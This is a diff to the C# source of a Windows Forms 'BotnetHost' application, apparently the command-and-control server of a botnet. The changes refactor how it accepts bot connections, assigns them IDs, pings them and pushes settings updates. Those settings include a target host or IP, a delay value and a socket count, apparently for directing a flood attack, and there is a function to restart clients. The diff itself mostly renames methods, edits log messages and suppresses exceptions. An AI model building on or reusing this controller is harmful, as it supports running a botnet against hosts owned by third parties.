@@ -29,8 +29,6 @@ namespace BotnetHost
         string previousLogMessage = "";
         Boolean restartClients = false;
 
-
-
         /// <summary>
         /// MainPanel Function, this is the constuctor for the window
         /// </summary>
@@ -41,9 +39,9 @@ namespace BotnetHost
             serverIPLabel.Text = "IP: " + serverIP;
             serverIPV4Label.Text = "IPV4: " + serverIPV4;
             serverPortLabel.Text = "Port: " + serverPort.ToString();
-            log("Starting Server...");
+            log("Starting Host-Server...");
             runServer = true;
-            mainServerThread = new Thread(() => serverThread());
+            mainServerThread = new Thread(() => serverSocketThread());
             mainServerThread.Start();
         }
 
@@ -51,32 +49,31 @@ namespace BotnetHost
         /// Client Socket Thread Function
         /// </summary>
         /// <param name="clientGUID">GUID of ClientConnection that this thread is responsible for</param>
-        public void clientSocketThread(string clientGUID)
+        public void clientSocketThread(string clientUID)
         {
-            Boolean runThread = true;
             ClientConnection clientConnection = null;
-            Socket clientSocket = null;
-            string clientName = "";
+            Thread clientThread = null;
+            Boolean runThread = false;
+
+            // Loop through client connections to find matching cliengGUID
+            foreach (ClientConnection connection in clientConnections)
+            {
+                if (connection.uid.ToString() == clientUID)
+                {
+                    try
+                    {
+                        // matching GUID found, this is our desired connection
+                        clientConnection = connection;
+                        runThread = true;
+                    }
+                    catch (Exception e) {}
+                }
+            }
+            
+            // Infinite loop while client is running
             while (runThread)
             {
-                // Loop through client connections to find matching cliengGUID
-                foreach (ClientConnection connection in clientConnections)
-                {
-                    if (connection.guid.ToString() == clientGUID)
-                    {
-                        try
-                        {
-                            // matching GUID found, this is our desired connection
-                            clientConnection = connection;
-                            clientSocket = clientConnection.clientSocket;
-                            clientName = clientSocket.RemoteEndPoint.ToString();
-                        } catch (Exception e)
-                        {
-                            runThread = false;
-                            break;
-                        }
-                    }
-                }
+                
                 Boolean hasUpdate = false;
                 updateStatusLabel.Invoke((MethodInvoker)delegate {
                     // Running on the UI thread
@@ -89,50 +86,33 @@ namespace BotnetHost
                     // CURRENTLY DISABLED BECAUSE WE DONT NEED IT, BUT IF CONTINUOUS COMMUNICATION IS NEEDED IN THE FUTURE, RE-ENABLE
                     while (false)
                     {
-                        log("Waiting for Client Responce...");
                         // Attempt to read incomming client message
                         try
                         {
                             // Data buffer 
                             byte[] bytes = new Byte[1024];
                             string data = null;
-                            int numByte = clientSocket.Receive(bytes);
+                            int numByte = clientConnection.clientSocket.Receive(bytes);
                             data += Encoding.ASCII.GetString(bytes, 0, numByte);
                             // Make sure message contains something
                             if (data.IndexOf("<EOF>") > -1)
                             {
-                                log("Responce recieved...");
+                                log("Message recieved from " + clientConnection.clientName);
                                 // Parse message for command handling
                                 data = data.Replace("<EOF>", "");
                                 if (data.Contains("["))
                                 {
-                                    log("Message Recieved: " + data);
+                                    log("Message: " + data);
                                     // Loop through client commands
-                                    string[] arr1 = data.Split(',').Select(s => s.Trim().Substring(1, s.Length - 2)).ToArray();
-                                    foreach (string item in arr1)
+                                    string[] messages = data.Split(',').Select(s => s.Trim().Substring(1, s.Length - 2)).ToArray();
+                                    foreach (string item in messages)
                                     {
-                                        // Client alive status is changed (probably shutting down)
-                                        if (item.Contains("Alive:"))
-                                        {
-                                            clientConnection.isAlive = Boolean.Parse(item.Substring(item.IndexOf(":") + 1));
-                                            if (!clientConnection.isAlive)
-                                            {
-                                                clientConnection.killClient();
-                                                runThread = false;
-                                            }
-                                        }
                                     }
                                 }
                                 break;
                             }
                         }
-                        catch (Exception e)
-                        {
-                            log("Connection interrupred with client " + clientSocket.RemoteEndPoint);
-                            clientConnection.isAlive = false;
-                            runThread = false;
-                            clientConnection.killClient();
-                        }
+                        catch (Exception e) { } // no message recieved
 
                     }
 
@@ -141,13 +121,13 @@ namespace BotnetHost
                     {
                         log("Sending Client Update: " + clientConnection.buildUpdate(new string[0]));
                         byte[] message = Encoding.ASCII.GetBytes(clientConnection.buildUpdate(new string[0]));
-                        clientSocket.Send(message);
+                        clientConnection.clientSocket.Send(message);
                         clientConnection.restart = false;
                     } else
                     {
                         log("Pinging client(s)... ");
                         byte[] message = Encoding.ASCII.GetBytes("ping!");
-                        clientSocket.Send(message);
+                        clientConnection.clientSocket.Send(message);
                     }
 
 
@@ -155,22 +135,24 @@ namespace BotnetHost
                     Thread.Sleep(1000);
                 } catch (Exception er)
                 {
-                    log("Connection with " + clientName + " has been interrupted... killing client...");
-                    clientConnection.killClient();
-                    clientConnections.Remove(clientConnection);
+                    log("Connection with " + clientConnection.clientName + " has been lost...");
                     runThread = false;
-                    updateClientPanel();
                 }
             }
             // Kill client
-
+            try
+            {
+                clientConnections.Remove(clientConnection);
+            }
+            catch (Exception e) { }
             clientConnection.killClient();
+            updateClientPanel();
         }
 
         /// <summary>
         /// Main Server Thread Function
         /// </summary>
-        public void serverThread()
+        public void serverSocketThread()
         {
             // Clear connections from previous server sessions
             clientConnections.Clear();
@@ -194,9 +176,9 @@ namespace BotnetHost
             {
                 // Using Bind() method we associate a network address to the Server Socket All client that will connect to this Server Socket must know this network Address 
                 serverSocket.Bind(localEndPoint);
-                log("Host server started on " + serverIPV4 + ":" + serverPort);
+                log("Host-Server started on " + serverIPV4 + ":" + serverPort);
                 // Using Listen() method we create the Client list that will want to connect to Server 
-                log("Waiting for client connections...");
+                log("Waiting for client(s) to connect...");
                 serverSocket.Listen(10);
                 while (runServer)
                 {
@@ -205,18 +187,17 @@ namespace BotnetHost
                         // Suspend while waiting for incoming connection Using Accept() method the server will accept connection of client 
                         Socket clientSocket = serverSocket.Accept();
                         // Add client socket to list of all client sockets
-                        log("Connection Established with " + clientSocket.RemoteEndPoint.ToString());
-
+                        string newUID = Guid.NewGuid().ToString();
+                        log("Client connected: " + clientSocket.RemoteEndPoint.ToString() + " [" + newUID.ToString() + "]");
                         // Create New Client Thread with GUID as paramater for connection tracking
-                        Guid newGUID = new Guid();
-                        Thread newClientThread = new Thread(() => clientSocketThread(newGUID.ToString()));
+                        Thread newClientThread = new Thread(() => clientSocketThread(newUID.ToString()));
                         // Create new 'ClientConnection' Object to track/link client connection & add to master list
                         ClientConnection newClientConnection = new ClientConnection(newClientThread, clientSocket);
-                        newClientConnection.guid = newGUID;
+                        newClientConnection.uid = newUID;
                         clientConnections.Add(newClientConnection);
                         // Start new client thread
                         newClientThread.Start();
-                        // Loop through active connections to check for dead clients
+                        // Loop through client connections to check for dead sockets
                         foreach (ClientConnection connection in clientConnections)
                         {
                             try
@@ -230,22 +211,19 @@ namespace BotnetHost
                                 log("Connection with " + connection.clientName + " has been interrupted... killing client...");
                                 connection.killClient();
                                 clientConnections.Remove(connection);
-                                updateClientPanel();
                             }
                         }
-                    } catch (Exception error)
-                    {
-                        // we should probably add some error handling here, although I dont believe it is necessary
-                    }
+                    } catch (Exception error){}
                     updateClientPanel();
                 }
-                // Stop Server
+                // Stop Server (server toggle was disabled)
                 log("Stopping Server...");
                 stopServer();
             }
-            catch (ThreadAbortException e)
+            catch (ThreadAbortException e){}
+            catch (Exception e)
             {
-                log("Server thread has been aborted/stopped");
+                log("Something bad happened:" + e.ToString());
             }
         }
 
@@ -255,9 +233,11 @@ namespace BotnetHost
         /// <param name="logMessage">Message to be displayed to user</param>
         public void log(string logMessage)
         {
+            // save raw message
             string raw = logMessage;
             // Build log message with date and message
             logMessage = "[" + DateTime.UtcNow + "] " + logMessage;
+            // make sure we are not printing duplicate messages
             if (raw != previousLogMessage)
             {
                 // Write to console in case of exception
@@ -287,7 +267,7 @@ namespace BotnetHost
                 }
                 catch (Exception e)
                 {
-                    log(e.ToString());
+                    Console.WriteLine(e.ToString());
                 }
             }
         }
@@ -305,20 +285,14 @@ namespace BotnetHost
             {
                 try
                 {
-                    if (item.isAlive)
-                    {
-                        ListViewItem clientItem = new ListViewItem();
-                        clientItem.Text = item.clientSocket.RemoteEndPoint.ToString();
-                        // Add tile to main panel
-                        clientListView.Invoke((MethodInvoker)delegate {
-                            // Running on the UI thread
-                            clientListView.Items.Add(clientItem);
-                        });
-                    }
-                } catch (Exception e)
-                {
-
-                }
+                    ListViewItem clientItem = new ListViewItem();
+                    clientItem.Text = item.clientSocket.RemoteEndPoint.ToString();
+                    // Add tile to main panel
+                    clientListView.Invoke((MethodInvoker)delegate {
+                        // Running on the UI thread
+                        clientListView.Items.Add(clientItem);
+                    });
+                } catch (Exception e){}
             }
         }
 
@@ -329,9 +303,8 @@ namespace BotnetHost
         /// <param name="e">This is the event argument</param>
         public void settingsChanged(object sender, EventArgs e)
         {
-            log("Client Settings have changed... Preparing Client Update...");
-            delayLabel.Text = delayTrackBar.Value.ToString();
-            socketsLabel.Text = socketsTrackBar.Value.ToString();
+            log("Sending settings to client(s)...");
+            // Loop through client connections and apply settings
             foreach (ClientConnection clientConnection in clientConnections)
             {
                 clientConnection.hostOrIP = metroTextBox1.Text;
@@ -361,13 +334,15 @@ namespace BotnetHost
         /// </summary>
         public void stopServer()
         {
-
+            // Toggle server switch
             serverToggle.Invoke((MethodInvoker)delegate {
                 // Running on the UI thread
                 serverToggle.Checked = false;
             });
             log("Stopping Server...");
+            // Disable boolean for server thread (force close)
             runServer = false;
+            // Close server socket and abort thread
             try
             {
                 serverSocket.Shutdown(SocketShutdown.Both);
@@ -401,8 +376,10 @@ namespace BotnetHost
         public void startServer()
         {
             log("Starting Server...");
+            // Enable boolean for server thread
             runServer = true;
-            mainServerThread = new Thread(() => serverThread());
+            // start new server thread
+            mainServerThread = new Thread(() => serverSocketThread());
             mainServerThread.Start();
         }
 
@@ -463,6 +440,8 @@ namespace BotnetHost
         {
             restartClients = true;
             settingsChanged(sender, e);
+            clientConnections.Clear();
+            updateClientPanel();
             restartClients = false;
         }
 
